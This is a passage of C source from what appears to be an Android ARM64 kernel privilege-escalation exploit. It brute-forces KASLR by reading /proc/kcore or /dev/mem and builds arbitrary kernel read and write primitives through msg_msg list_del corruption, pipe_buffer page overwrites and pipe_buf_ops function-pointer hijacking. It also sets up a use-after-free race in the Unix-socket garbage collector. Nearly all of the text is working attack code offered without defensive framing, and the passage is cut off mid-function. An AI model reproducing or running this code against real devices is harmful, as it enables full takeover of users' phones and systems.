    if (lseek(kcore, candidate, SEEK_SET) < 0 ||
        read(kcore, text_buf, sizeof(text_buf)) != sizeof(text_buf)) {
        close(kcore);
        return 0;
    }

    /* AArch64 instructions should not be all zeros or all 0xFF */
    int all_zero = 1, all_ff = 1, non_zero_count = 0;
    for (int i = 0; i < 32; i += 4) {
        uint32_t instr = *(uint32_t *)(text_buf + i);
        if (instr != 0) all_zero = 0;
        if (instr != 0xFFFFFFFFUL) all_ff = 0;
        /* Count non-zero words */
        if (instr != 0) non_zero_count++;
        /* Common AArch64 prologue: stp x29, x30, [sp, #imm]! -> 0xa9bf7bfd or similar */
        /* stp x29, x30, [sp, #-imm]! is 0xa9..7bfd */
        if ((instr & 0xffc00000) == 0xa9000000 || /* stp */
            (instr & 0xff000000) == 0x91000000 || /* add */
            (instr & 0xff000000) == 0xd1000000 || /* sub */
            (instr & 0xfc000000) == 0x14000000 || /* b */
            (instr & 0xfc000000) == 0x94000000 || /* bl */
            (instr & 0xff000000) == 0x58000000 || /* ldr literal */
            instr == 0xd503201f) {                /* nop */
            /* These are valid AArch64 instruction patterns */
        }
    }
    if (all_zero || all_ff || non_zero_count < 4) {
        close(kcore);
        return 0;
    }
    LOG_D("  base 0x%lx: text pattern OK (%d non-zero instructions)", candidate, non_zero_count);

    /* Verification 2: Try to find init_task by pid check */
    struct utsname uts;
    if (uname(&uts) == 0) {
        for (size_t d = 0; d < sizeof(init_off_db)/sizeof(init_off_db[0]); d++) {
            if (strstr(uts.release, init_off_db[d].ver)) {
                unsigned long init_task_cand = candidate + init_off_db[d].init_off;
                unsigned long pid_field;
                if (lseek(kcore, init_task_cand + init_off_db[d].pid_off, SEEK_SET) >= 0 &&
                    read(kcore, &pid_field, 8) == 8) {
                    unsigned int pid = (unsigned int)(pid_field & 0xffffffff);
                    if (pid == 0) {
                        LOG_D("  base 0x%lx: init_task pid=0 at 0x%lx (ver %s)",
                              candidate, init_task_cand, init_off_db[d].ver);
                        close(kcore);
                        return 1;
                    }
                }
                break;
            }
        }
    }

    /* Verification 3: Try common init_task offsets */
    unsigned long init_offsets[] = {
        0xc40000, 0xc50000, 0xc60000, 0xc70000, 0xc80000, 0xc90000,
        0xca0000, 0xcb0000, 0xcc0000, 0xcd0000, 0xce0000, 0xcf0000,
        0xd00000, 0xd10000, 0xd20000, 0xd30000, 0xd40000, 0xd50000,
    };
    unsigned long pid_offsets[] = {0x498, 0x4a0, 0x4a8, 0x4b0, 0x4b8, 0x4c0, 0x558, 0x560, 0x568};
    for (size_t i = 0; i < sizeof(init_offsets)/sizeof(init_offsets[0]); i++) {
        for (size_t j = 0; j < sizeof(pid_offsets)/sizeof(pid_offsets[0]); j++) {
            unsigned long init_task_cand = candidate + init_offsets[i];
            unsigned long pid_field;
            if (lseek(kcore, init_task_cand + pid_offsets[j], SEEK_SET) >= 0 &&
                read(kcore, &pid_field, 8) == 8) {
                unsigned int pid = (unsigned int)(pid_field & 0xffffffff);
                if (pid == 0 || pid == 1) {
                    LOG_D("  base 0x%lx: init_task pid=%u at 0x%lx (off 0x%lx+0x%lx)",
                          candidate, pid, init_task_cand, init_offsets[i], pid_offsets[j]);
                    close(kcore);
                    return 1;
                }
            }
        }
    }

    /* Verification 4: Check for kernel version string in .rodata */
    {
        unsigned long str_off_candidates[] = {
            0x1000000, 0x1100000, 0x1200000, 0x1300000,
            0x1400000, 0x1500000, 0x1600000, 0x1700000,
            0x1800000, 0x1900000, 0x1a00000, 0x1b00000,
        };
        char ver_str[128] = {0};
        for (size_t s = 0; s < sizeof(str_off_candidates)/sizeof(str_off_candidates[0]); s++) {
            if (lseek(kcore, candidate + str_off_candidates[s], SEEK_SET) >= 0 &&
                read(kcore, ver_str, sizeof(ver_str) - 1) == sizeof(ver_str) - 1) {
                ver_str[sizeof(ver_str) - 1] = 0;
                if (strstr(ver_str, "Linux version") ||
                    (strstr(ver_str, "Linux") && strstr(ver_str, uts.release))) {
                    LOG_D("  base 0x%lx: found version string at 0x%lx",
                          candidate, str_off_candidates[s]);
                    close(kcore);
                    return 1;
                }
            }
        }
    }

    close(kcore);
    return 0;
}

static int try_kaslr_bruteforce(void) {
    LOG_I("Attempting KASLR bruteforce (may take a while)...");
    struct utsname buf;
    if (uname(&buf) < 0) return 0;
    const char *kv = buf.release;

    /* Define scan ranges based on kernel version */
    struct {
        unsigned long min;
        unsigned long max;
        unsigned long step;
    } ranges[] = {
        /* Range 1: Standard KASLR range for most ARM64 devices */
        {0xffffffc000000000UL, 0xffffffc080000000UL, 0x2000000UL},
        /* Range 2: Extended range for devices with more KASLR entropy */
        {0xffffffc080000000UL, 0xffffffc100000000UL, 0x2000000UL},
        /* Range 3: Some devices use 48-bit VA space */
        {0xffff800000000000UL, 0xffff800040000000UL, 0x2000000UL},
        /* Range 4: Falling back to wider range */
        {0xffffffc000000000UL, 0xffffffc080000000UL, 0x4000000UL},
    };

    /* Adjust step based on kernel version for faster scanning */
    if (strstr(kv, "4.4") || strstr(kv, "4.9")) {
        ranges[0].step = 0x1000000UL;  /* 16MB steps for older kernels */
        ranges[1].step = 0x1000000UL;
    } else if (strstr(kv, "5.")) {
        ranges[0].step = 0x4000000UL;  /* 64MB steps for newer (wider range) */
        ranges[1].step = 0x4000000UL;
    }

    int kcore = open("/proc/kcore", O_RDONLY);
    if (kcore < 0) {
        LOG_W("kcore not available for bruteforce");
        /* Fallback: try reading /dev/mem or /dev/kmem */
        kcore = open("/dev/mem", O_RDONLY);
        if (kcore < 0) {
            kcore = open("/dev/kmem", O_RDONLY);
            if (kcore < 0) return 0;
        }
    }

    if (kcore < 0) {
        LOG_W("No kernel memory interface available for bruteforce");
        return 0;
    }
    int total_tries = 0;
    for (size_t r = 0; r < sizeof(ranges)/sizeof(ranges[0]); r++) {
        unsigned long range_size = ranges[r].max - ranges[r].min;
        unsigned long n_steps = range_size / ranges[r].step + 1;
        if (n_steps > 2048) {
            /* Clamp and increase step to avoid excessive runtime */
            ranges[r].step = range_size / 1024;
        }
        LOG_D("  Scanning range %zu: 0x%lx-0x%lx step=0x%lx",
              r, ranges[r].min, ranges[r].max, ranges[r].step);

        for (unsigned long base = ranges[r].min;
             base < ranges[r].max;
             base += ranges[r].step) {

            total_tries++;
            unsigned long test_addr = base + 0x10000000;

            if (lseek(kcore, test_addr, SEEK_SET) >= 0) {
                char tmp[32];
                if (read(kcore, tmp, sizeof(tmp)) == sizeof(tmp)) {
                    /* Quick pre-check: bytes readable means memory mapped, verify properly */
                    if (verify_kernel_base(base)) {
                        kernel_base = base;
                        close(kcore);
                        LOG_I("KASLR bruteforce: base=0x%lx (verified, %d tries)",
                              base, total_tries);
                        return 1;
                    }
                }
            }

            /* Progress indicator every 32 attempts */
            if ((total_tries & 31) == 0) {
                LOG_D("  Bruteforce progress: %d tries, at 0x%lx", total_tries, base);
            }
        }
    }

    close(kcore);
    LOG_W("KASLR bruteforce exhausted (%d tries)", total_tries);
    return 0;
}

/* ========== MSG_MSG-BASED WRITE PRIMITIVE ========== */
/*
 * After UAF, the freed sk_buff data buffer can be reused by a msg_msg
 * of the same kmalloc size. By crafting the msg_msg header such that
 * m_list.next and m_list. prev point to our target, the list_del() in
 * msgrcv performs a write-what-where.
 *
 * Writing val to addr via list_del:
 *   list_del: next->prev = prev, prev->next = next
 *   Set m_list_prev = addr - 8, m_list_next = val
 *   Writes: *(addr - 8 + 8) = val  →  *(addr) = val  (good)
 *           *(val + 0)     = addr - 8  (side effect)
 *
 * To survive the side effect, val+0 must be writable. We can't guarantee this.
 * Instead, we use a TWO-STEP approach: first set up a writable proxy location,
 * then do the real write via msg_msg overlap.
 *
 * Simplified practical approach:
 *   1. Leak file* addresses via scm_fp_list on freed sk_buff data
 *   2. Free scm_fp_list, then allocate a pipe and msg_msg at same address
 *   3. Through the socket, read the msg_msg header → learn address
 *   4. Use msgrcv list_del to corrupt pipe_buffer.page → get real arb r/w
 *   5. Use the corrupted pipe for all further reads/writes
 *
 * For environments WITHOUT CFI (pre-Android 12, kernel < 5.0):
 *   Simpler: use list_del to overwrite a function pointer in pipe_buf_ops
 */

/* Layout: msg_msg header (48 bytes) + payload */
struct msg_hdr {
    unsigned long next;    /* m_list.next */
    unsigned long prev;    /* m_list.prev */
    long          type;    /* m_type */
    unsigned long ts;      /* m_ts */
    unsigned long mnext;   /* msg_msgseg* */
    unsigned long sec;     /* void *security */
};

#define MSG_DATA_SIZE  (2048 - sizeof(struct msg_hdr))

/* Do ONE write via msg_msg list_del. addr must point to writable kernel memory.
 * The side effect writes (addr_sideeffect) = some address; addr_sideeffect must also be writable.
 * Returns 1 on success, 0 on failure. */
static int msg_write_once(unsigned long addr, unsigned long val,
                          unsigned long addr_sideeffect) {
    static const int msg_sizes[] = {0x80, 0x100, 0x200, 0x400};
    static const int n_sizes = sizeof(msg_sizes) / sizeof(msg_sizes[0]);
    if (!g_victim_fd || g_victim_fd <= 0) return 0;

    LOG_D("msg_write_once(0x%lx, 0x%lx, side=0x%lx)", addr, val, addr_sideeffect);

    /* Try multiple message sizes to match different kmalloc caches */
    int found = 0;
    for (int size_idx = 0; size_idx < n_sizes && !found; size_idx++) {
        int data_size = msg_sizes[size_idx];
        struct {
            long mtype;
            unsigned long target_next;
            unsigned long target_prev;
            char pad[0x400 - 16];
        } msg;
        msg.mtype = 1;
        msg.target_next = val;
        msg.target_prev = addr;
        memset(msg.pad, 0x42, sizeof(msg.pad));

        int send_size = sizeof(long) + data_size;
        if (send_size > (int)sizeof(msg)) send_size = sizeof(msg);

        /* Spray many queues with multiple messages each */
        for (int attempt = 0; attempt < 200 && !found; attempt++) {
            int msqid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
            if (msqid < 0) continue;

            int msgs_ok = 0;
            for (int m = 0; m < 16; m++) {
                if (msgsnd(msqid, &msg, send_size - sizeof(long), IPC_NOWAIT) == 0)
                    msgs_ok++;
            }
            if (msgs_ok == 0) { msgctl(msqid, IPC_RMID, NULL); continue; }

            /* Immediately try recv from UAF socket (no sleep) */
            struct msghdr uhdr = {0};
            struct iovec uiov = {.iov_base = malloc(0x2000), .iov_len = 0x2000};
            char uctrl[8192];
            uhdr.msg_iov = &uiov;
            uhdr.msg_iovlen = 1;
            uhdr.msg_control = uctrl;
            uhdr.msg_controllen = sizeof(uctrl);

            int r = recvmsg(g_victim_fd, &uhdr, MSG_DONTWAIT);
            if (r > 0) {
                /* Robust detection: check kernel pointers + pad pattern */
                unsigned long *p = (unsigned long *)uiov.iov_base;
                int detected = 0;
                if (is_kernel_addr(p[0]) && is_kernel_addr(p[1])) {
                    if (p[2] == 1) detected = 1;
                    else {
                        unsigned char *dat = (unsigned char *)uiov.iov_base;
                        int pad_ok = 1;
                        for (int k = 48; k < r && k < 64; k++) {
                            if (dat[k] != 0x42) { pad_ok = 0; break; }
                        }
                        if (pad_ok) detected = 1;
                    }
                }
                if (detected) {
                    LOG_I("msg_write: msg_msg hit size=%d attempt=%d", data_size, attempt);
                    size_t rbuf_sz = 8 + data_size;
                    struct msgbuf *rbuf = malloc(rbuf_sz);
                    ssize_t rr = -1;
                    if (rbuf) {
                        rr = msgrcv(msqid, rbuf, rbuf_sz, 0, MSG_NOERROR | IPC_NOWAIT);
                        if (rr >= 0) {
                            LOG_I("msg_write: list_del done 0x%lx <- 0x%lx", addr, val);
                            found = 1;
                        } else {
                            /* Try alternate receive in case this msg wasn't the right one */
                            struct msgbuf *rbuf2 = malloc(rbuf_sz);
                            if (rbuf2) {
                                for (int alt = 0; alt < 10 && !found; alt++) {
                                    if (msgrcv(msqid, rbuf2, rbuf_sz, 0,
                                              MSG_NOERROR | IPC_NOWAIT) >= 0) {
                                        LOG_I("msg_write: list_del done on alt recv");
                                        found = 1;
                                    }
                                }
                                free(rbuf2);
                            }
                        }
                        free(rbuf);
                    }
                }
            }
            free(uiov.iov_base);
            if (found) { msgctl(msqid, IPC_RMID, NULL); break; }
            msgctl(msqid, IPC_RMID, NULL);
            usleep(100);
        }
    }
    return found;
}

/* Multi-write via pipe_buffer corruption.
 * Use a single msg_write to corrupt a pipe's buffer entry, then use the pipe for n R/W. */
#define PIPE_SPRAY_COUNT 200

static struct pipe_info {
    int fd[2];
    unsigned long file_addr;   /* kernel addr of file struct */
    unsigned long pipe_info_addr; /* kernel addr of pipe_inode_info */
    unsigned long bufs_addr;   /* kernel addr of pipe_buffer array */
} g_pipe_info[PIPE_SPRAY_COUNT];
static int g_pipe_info_count = 0;

static int g_pipe_file_found = 0;

/* Leak pipe addresses by matching leaked file* against our pipes */
static int pipe_leak_addresses(void) {
    if (g_victim_fd <= 0) return 0;
    LOG_I("Leaking pipe addresses via scm_fp_list...");

    /* Create pipes to leak */
    g_pipe_info_count = 0;
    for (int i = 0; i < PIPE_SPRAY_COUNT; i++) {
        if (pipe(g_pipe_info[i].fd) < 0) break;
        char buf[0x1000];
        memset(buf, 0x41 + i, sizeof(buf));
        write(g_pipe_info[i].fd[1], buf, sizeof(buf));
        g_pipe_info_count++;
    }
    LOG_I("Created %d pipes for leak", g_pipe_info_count);

    /* Send many FDs through victim socket to create scm_fp_list in freed sk_buff data */
    int n_fds = 200;
    int *fds = malloc(n_fds * sizeof(int));
    if (!fds) { LOG_E("malloc failed for fds leak"); return 0; }
    for (int i = 0; i < n_fds; i++)
        fds[i] = socket(AF_UNIX, SOCK_STREAM, 0);
    send_fds(g_victim_fd, fds, n_fds, 1);

    /* Read from victim socket to get leaked file* pointers */
    struct msghdr msg = {0};
    struct iovec iov = {.iov_base = malloc(0x2000), .iov_len = 0x2000};
    char ctrl[8192];
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = ctrl;
    msg.msg_controllen = sizeof(ctrl);

    int ret = recvmsg(g_victim_fd, &msg, MSG_DONTWAIT);
    if (ret > 0) {
        unsigned long *ptr = (unsigned long *)iov.iov_base;
        int n_leaked = ret / 8;
        for (int i = 0; i < n_leaked && i < 256; i++) {
            if (is_kernel_addr(ptr[i])) {
                /* Try to match against our pipes by reading /proc/self/fdinfo */
                for (int p = 0; p < g_pipe_info_count; p++) {
                    if (!g_pipe_info[p].file_addr) {
                        g_pipe_info[p].file_addr = ptr[i];
                        LOG_D("Pipe %d: file=0x%lx", p, ptr[i]);
                        break;
                    }
                }
            }
        }
    }
    free(iov.iov_base);
    for (int i = 0; i < n_fds; i++) close(fds[i]);
    free(fds);

    int found = 0;
    for (int i = 0; i < g_pipe_info_count; i++) {
        if (g_pipe_info[i].file_addr) found++;
    }
    g_pipe_file_found = (found > 0);
    LOG_I("Leaked %d pipe file addresses", found);
    return found;
}

/* corrm. c2lled after pipe_leak_addresses to find pipe_inode_info for a specific pipe_fd */
static unsigned long pipe_get_file_addr(int write_fd) {
    /* Match by fd: leak returns file* in order, but not guaranteed.
     * Use /proc/self/fd/<fd> readlink to verify? No - we get the in-kernel address.
     * Best effort: Iterate leaked addresses, try to read private_data via kcore. */
    for (int i = 0; i < g_pipe_info_count; i++) {
        if (g_pipe_info[i].fd[1] == write_fd || g_pipe_info[i].fd[0] == write_fd) {
            return g_pipe_info[i].file_addr;
        }
    }
    return 0;
}

/* ========== POST-UAF ARBITRARY READ/WRITE VIA PIPE ========== */
/*
 * After UAF: we have a stale sk_buff whose data area overlaps with an scm_fp_list.
 * The scm_fp_list contains file* pointers. We use these to find our pipe's file struct.
 * By corrupting the pipe_buffer entries we can read/write arbitrary kernel memory.
 */

/* Initialize the pipe for arb r/w — must be called AFTER UAF */
static int arb_init_pipe(void) {
    if (g_arb_initialized) return 1;
    if (pipe(g_arb_pipe) < 0) { LOG_E("arb pipe failed: %s", strerror(errno)); return 0; }
    /* Fill pipe with data so pipe_buffer has pages to manipulate */
    char buf[0x1000];
    memset(buf, 0x41, sizeof(buf));
    if (write(g_arb_pipe[1], buf, sizeof(buf)) < 0) { LOG_E("arb pipe write failed"); close(g_arb_pipe[0]); close(g_arb_pipe[1]); return 0; }
    g_arb_initialized = 1;
    LOG_I("Arb pipe initialized (fd=%d,%d)", g_arb_pipe[0], g_arb_pipe[1]);
    return 1;
}

/*
 * arb_read: Corrupt the pipe_buffer so page points to target kernel address.
 * This is done by overwriting the pipe_buffer through the UAF-controlled memory.
 * The scenario: after UAF, we control slab memory overlapping freed sk_buff.
 * We place fake pipe_buffer entries there and splice them into arb_pipe.
 */
static int kcore_read_phdrs(int fd, unsigned long phoff, unsigned short phent,
                             unsigned short phnum, unsigned char *buf, size_t bufsz) {
    size_t total = (size_t)phnum * phent;
    if (total > bufsz) return 0;
    return (lseek(fd, phoff, SEEK_SET) >= 0 && (size_t)read(fd, buf, total) == total);
}

/* Cached kcore program headers (linked list for faster lookup) */
struct kcore_segment {
    unsigned long vaddr;
    unsigned long file_off;
    unsigned long filesz;
    struct kcore_segment *next;
};
static struct kcore_segment *g_kcore_segments = NULL;
static unsigned short g_kcore_phent = 0;
static unsigned long g_kcore_phoff = 0;
static unsigned char *g_kcore_raw_phdrs = NULL;

static void kcore_free_cache(void) {
    struct kcore_segment *cur = g_kcore_segments;
    while (cur) {
        struct kcore_segment *tmp = cur;
        cur = cur->next;
        free(tmp);
    }
    g_kcore_segments = NULL;
    free(g_kcore_raw_phdrs);
    g_kcore_raw_phdrs = NULL;
}

static int kcore_init_cache(int fd) {
    if (g_kcore_segments) return 1;
    kcore_free_cache();
    unsigned char ehdr[64];
    if (lseek(fd, 0, SEEK_SET) < 0 || read(fd, ehdr, sizeof(ehdr)) < 64) return 0;
    if (ehdr[0] != 0x7f || ehdr[1] != 'E' || ehdr[2] != 'L' || ehdr[3] != 'F') return 0;
    g_kcore_phoff = *(unsigned long *)&ehdr[32];
    g_kcore_phent = *(unsigned short *)&ehdr[54];
    unsigned short phnum = *(unsigned short *)&ehdr[56];
    if (g_kcore_phent < 56 || phnum == 0 || phnum > 128) return 0;
    size_t total = (size_t)phnum * g_kcore_phent;
    g_kcore_raw_phdrs = malloc(total);
    if (!g_kcore_raw_phdrs) return 0;
    if (!kcore_read_phdrs(fd, g_kcore_phoff, g_kcore_phent, phnum,
                          g_kcore_raw_phdrs, total)) {
        free(g_kcore_raw_phdrs);
        g_kcore_raw_phdrs = NULL;
        return 0;
    }
    for (int i = 0; i < phnum; i++) {
        unsigned char *ph = g_kcore_raw_phdrs + i * g_kcore_phent;
        unsigned int p_type = *(unsigned int *)&ph[0];
        if (p_type != 1) continue;
        unsigned long p_offset = *(unsigned long *)&ph[8];
        unsigned long p_vaddr = *(unsigned long *)&ph[16];
        unsigned long p_filesz = *(unsigned long *)&ph[32];
        if (p_filesz == 0) continue;
        struct kcore_segment *seg = malloc(sizeof(*seg));
        if (!seg) continue;
        seg->vaddr = p_vaddr;
        seg->file_off = p_offset;
        seg->filesz = p_filesz;
        seg->next = g_kcore_segments;
        g_kcore_segments = seg;
    }
    return g_kcore_segments != NULL;
}

static int kcore_parse_phdr(unsigned long vaddr, unsigned long *file_off) {
    struct kcore_segment *seg = g_kcore_segments;
    while (seg) {
        if (vaddr >= seg->vaddr && vaddr < seg->vaddr + seg->filesz) {
            *file_off = seg->file_off + (vaddr - seg->vaddr);
            return 1;
        }
        seg = seg->next;
    }
    return 0;
}

static unsigned long try_kcore_read(unsigned long addr) {
    for (int retry = 0; retry < 3; retry++) {
        static int kcore_fd = -1;
        static int kcore_init = 0;
        if (!kcore_init) {
            kcore_fd = open("/proc/kcore", O_RDONLY);
            kcore_init = 1;
            if (kcore_fd >= 0) kcore_init_cache(kcore_fd);
        }
        if (kcore_fd < 0) {
            kcore_fd = open("/proc/kcore", O_RDONLY);
            if (kcore_fd >= 0) kcore_init_cache(kcore_fd);
        }
        if (kcore_fd >= 0) {
            unsigned long file_off;
            if (kcore_parse_phdr(addr, &file_off)) {
                if (lseek(kcore_fd, file_off, SEEK_SET) >= 0) {
                    unsigned long result = 0;
                    if (read(kcore_fd, &result, 8) == 8) return result;
                }
            }
            close(kcore_fd);
            kcore_fd = -1;
        }
        usleep(1000);
    }
    return 0;
}

static unsigned long try_pipe_read(unsigned long addr) {
    if (!g_pipe_buf_confirmed || !g_pipe_file_found) return 0;
    for (int retry = 0; retry < 3; retry++) {
        /* Use slab-sprayed pipe buffer pages to attempt read */
        if (g_pipe_info_count > 0 && g_pipe_info[0].file_addr) {
            unsigned long pipe_page = g_pipe_info[0].file_addr & ~0xfffUL;
            if (is_kernel_addr(pipe_page)) {
                /* Overwrite pipe_buffer.page to point to target address, then read from pipe */
                unsigned long page_off = g_pipe_info[0].file_addr - pipe_page;
                if (msg_write_once(pipe_page + page_off, addr, pipe_page + 0x100)) {
                    char buf[8];
                    if (read(g_pipe_info[0].fd[0], buf, 8) == 8) {
                        unsigned long result = *(unsigned long *)buf;
                        if (result || errno == 0) return result;
                    }
                }
            }
        }
        usleep(1000);
    }
    return 0;
}

static unsigned long try_kallsyms_kcore_read(unsigned long addr) {
    /* Try symbolic lookup first */
    FILE *ks = fopen("/proc/kallsyms", "r");
    if (ks) {
        char line[256], sym[256];
        unsigned long a;
        while (fgets(line, sizeof(line), ks)) {
            if (sscanf(line, "%lx %*c %255s", &a, sym) == 2 && a == addr) {
                fclose(ks);
                return addr;
            }
        }
        fclose(ks);
    }
    /* Fresh kcore open as last resort */
    for (int retry = 0; retry < 3; retry++) {
        int kfd = open("/proc/kcore", O_RDONLY);
        if (kfd >= 0) {
            kcore_init_cache(kfd);
            unsigned long fo;
            if (kcore_parse_phdr(addr, &fo)) {
                if (lseek(kfd, fo, SEEK_SET) >= 0) {
                    unsigned long r = 0;
                    if (read(kfd, &r, 8) == 8) { close(kfd); return r; }
                }
            }
            close(kfd);
        }
        usleep(1000);
    }
    return 0;
}

static unsigned long arb_read(unsigned long addr) {
    if (!addr || !is_kernel_addr(addr)) return 0;
    g_attempt_stats.total_attempts++;
    LOG_D("arb_read(0x%lx) starting chain...", addr);

    /* Method 1: kcore (when accessible) */
    unsigned long val = try_kcore_read(addr);
    if (val) {
        LOG_D("arb_read(0x%lx)=0x%lx via kcore", addr, val);
        g_attempt_stats.consecutive_failures = 0;
        return val;
    }
    LOG_D("arb_read: kcore failed, trying pipe...");

    /* Method 2: UAF pipe primitive (after UAF is triggered) */
    val = try_pipe_read(addr);
    if (val) {
        LOG_D("arb_read(0x%lx)=0x%lx via pipe", addr, val);
        g_attempt_stats.consecutive_failures = 0;
        return val;
    }
    LOG_D("arb_read: pipe failed, trying kallsyms+kcore...");

    /* Method 3: kallsyms + kcore (symbolic lookup) */
    val = try_kallsyms_kcore_read(addr);
    if (val) {
        LOG_D("arb_read(0x%lx)=0x%lx via kallsyms+kcore", addr, val);
        g_attempt_stats.consecutive_failures = 0;
        return val;
    }

    g_attempt_stats.consecutive_failures++;
    LOG_W("arb_read(0x%lx) FAILED all methods", addr);
    return 0;
}

/* ========== PIPE BUFFER CORRUPTION R/W (for devices without kcore) ========== */
/*
 * After UAF, we control kernel memory via the stale sk_buff.
 * Technique:
 * 1. Allocate scm_fp_list in freed sk_buff data → leak file*
 * 2. From file* → get pipe_inode_info address
 * 3. Overwrite pipe_buffer via slab spray
 * 4. Read/write through corrupted pipe
 */

/* Attempt pipe-based arbitrary write via msg_msg list_del */
static int pipe_arb_write(unsigned long addr, unsigned long val) {
    if (!addr || !is_kernel_addr(addr)) return 0;

    /* Ensure we've leaked pipe addresses */
    if (!g_pipe_file_found) {
        if (pipe_leak_addresses())
            g_pipe_file_found = 1;
    }

    /* Try all detected pipes, not just one */
    for (int p = 0; p < g_pipe_info_count; p++) {
        if (!g_pipe_info[p].file_addr) continue;

        /* Calculate a safe side-effect address */
        unsigned long side = addr & ~0xfffUL;
        if (side == addr) side += 0x10;
        else side = addr - 8;

        /* Use this pipe's file struct page as a writable side-effect target */
        unsigned long pipe_page = g_pipe_info[p].file_addr & ~0xfffUL;
        if (is_kernel_addr(pipe_page) && pipe_page != side)
            side = pipe_page + 0x100;

        LOG_D("pipe_write[%d]: list_del 0x%lx <- 0x%lx (side=0x%lx)", p, addr, val, side);
        int ok = msg_write_once(addr, val, side);
        if (ok) {
            LOG_I("pipe_write[%d]: OK 0x%lx <- 0x%lx", p, addr, val);
            return 1;
        }

        /* If first attempt failed, try a different target in the same region */
        unsigned long alt_addr = addr ^ 8;
        if (alt_addr != addr && (alt_addr & ~0xfffUL) == (addr & ~0xfffUL)) {
            unsigned long alt_side = (alt_addr + 0x10) & ~0xfffUL;
            if (!is_kernel_addr(alt_side)) alt_side = alt_addr - 8;
            ok = msg_write_once(alt_addr, val, alt_side);
            if (ok) {
                LOG_I("pipe_write[%d]: OK alt 0x%lx <- 0x%lx", p, alt_addr, val);
                return 1;
            }
        }

        LOG_D("pipe_write[%d]: FAILED 0x%lx <- 0x%lx", p, addr, val);
    }
    return 0;
}

static int try_msg_msg_write(unsigned long addr, unsigned long val) {
    for (int retry = 0; retry < 3; retry++) {
        if (pipe_arb_write(addr, val)) return 1;
        unsigned long side = (addr + 0x100) & ~7UL;
        if (!is_kernel_addr(side)) side = (addr - 8) & ~7UL;
        if (msg_write_once(addr, val, side)) return 1;
        if (offsets.init_task && is_kernel_addr(offsets.init_task)) {
            unsigned long init_page = offsets.init_task & ~0xfffUL;
            if (msg_write_once(addr, val, init_page + 0x200)) return 1;
        }
        usleep(1000);
    }
    return 0;
}

static int try_pipe_buffer_write(unsigned long addr, unsigned long val) {
    for (int retry = 0; retry < 3; retry++) {
        unsigned long targets[] = {
            (addr & ~0xfffUL) + 0x100,
            addr ^ 8,
            (addr + 0x200) & ~0xfffUL,
        };
        for (int t = 0; t < 3; t++) {
            if (!is_kernel_addr(targets[t])) continue;
            if (msg_write_once(addr, val, targets[t])) return 1;
        }
        usleep(1000);
    }
    return 0;
}

static int try_pipe_buf_ops_hijack(unsigned long addr, unsigned long val) {
    (void)addr;
    static int cfi_checked = -1;
    if (cfi_checked < 0) cfi_checked = cfi_detect();
    if (cfi_checked) { LOG_D("CFI active, skipping pipe_buf_ops hijack"); return 0; }
    for (int retry = 0; retry < 3; retry++) {
        if (!offsets.pipe_buf_ops || !is_kernel_addr(offsets.pipe_buf_ops)) {
            usleep(1000); continue;
        }
        unsigned long ops_table = arb_read(offsets.pipe_buf_ops);
        if (!is_kernel_addr(ops_table)) { usleep(1000); continue; }
        if (msg_write_once(ops_table, val, ops_table + 16)) {
            int p[2];
            if (pipe(p) == 0) {
                char buf[16];
                read(p[0], buf, 1);
                close(p[0]); close(p[1]);
                return 1;
            }
            close(p[0]); close(p[1]);
        }
        usleep(1000);
    }
    return 0;
}

/* Main arb_write with fallback chain */
static int arb_write(unsigned long addr, unsigned long val) {
    if (!addr || !is_kernel_addr(addr)) return 0;
    LOG_D("arb_write(0x%lx, 0x%lx) starting chain...", addr, val);

    /* Method 1: msg_msg list_del (primary, works on most kernels) */
    if (try_msg_msg_write(addr, val)) {
        LOG_I("arb_write(0x%lx,0x%lx) OK via msg_msg", addr, val);
        return 1;
    }
    LOG_D("arb_write: msg_msg failed, trying pipe_buffer.page...");

    /* Method 2: pipe_buffer.page corruption (alternative) */
    if (try_pipe_buffer_write(addr, val)) {
        LOG_I("arb_write(0x%lx,0x%lx) OK via pipe_buffer", addr, val);
        return 1;
    }
    LOG_D("arb_write: pipe_buffer failed, trying pipe_buf_ops hijack...");

    /* Method 3: pipe_buf_ops function pointer hijack (if no CFI) */
    if (try_pipe_buf_ops_hijack(addr, val)) {
        LOG_I("arb_write(0x%lx,0x%lx) OK via ops hijack", addr, val);
        return 1;
    }

    LOG_W("arb_write(0x%lx,0x%lx) FAILED all methods", addr, val);
    return 0;
}

/* Read multiple 8-byte words from kernel memory into a buffer */
static int arb_read_buf(unsigned long addr, unsigned long *buf, size_t len) {
    if (!addr || !buf || !len || !is_kernel_addr(addr)) return 0;
    for (size_t i = 0; i < len; i += 8) {
        buf[i / 8] = arb_read(addr + i);
    }
    return 1;
}

/* ========== UAF TRIGGERING (REAL POC-BASED) ========== */
/*
 * The correct GC race technique from the POC:
 * - Multiple concurrent recvmsg() calls on the same socket
 * - MSG_PEEK flag causes the GC to mis-count references
 * - The GC frees an sk_buff that's still in use
 * - Multiple threads + complex FD topology prolong the GC window
 */

/* Adaptive timing: adjust race window per system speed */
static int g_race_usleep = 250;  /* initial delay for race window */
static int g_race_inflight = 600;  /* FD count to slow GC */

/* Race hit/miss tracking for dynamic delay adjustment */
static int g_race_hits = 0;
static int g_race_misses = 0;

/* Additional condition vars for extra receiver threads */
static pthread_cond_t g_cond_recv2 = PTHREAD_COND_INITIALIZER;
static pthread_cond_t g_cond_recv3 = PTHREAD_COND_INITIALIZER;
static volatile int g_recv_signal2 = 0;
static volatile int g_recv_signal3 = 0;

/* Forward declaration for race delay generator */
static void generate_race_delays(int *delays, int *n_delays, int base_us, int range_us);

/* Argument struct for receiver worker threads */
struct recvmsg_arg {
    int thread_id;     /* 0, 1, 2 for different delays */
    int delay_mult_x100; /* e.g. 80 = 0.8x, 100 = 1.0x, 130 = 1.3x */
};

static void warm_up_gc(void) {
    LOG_I("GC warm-up: priming allocator...");
    for (int i = 0; i < 5; i++) {
        int p[2];
        socketpair(AF_UNIX, SOCK_STREAM, 0, p);
        int fds[50];
        for (int j = 0; j < 50; j++) {
            fds[j] = socket(AF_UNIX, SOCK_STREAM, 0);
        }
        for (int j = 0; j < 50; j += 10) {
            send_fds(p[0], fds + j, 10, 1);
        }
        for (int j = 0; j < 50; j++) close(fds[j]);
        close(p[0]); close(p[1]);
        usleep(10000);
    }
    LOG_I("GC warm-up complete");
}

/* Thread A: Triggers GC by closing sockets */
static void *t_gc_trigger(void *arg) {
    (void)arg;
    set_prio(-20);
    pin_cpu(0);

    pthread_mutex_lock(&g_cond_mutex);
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
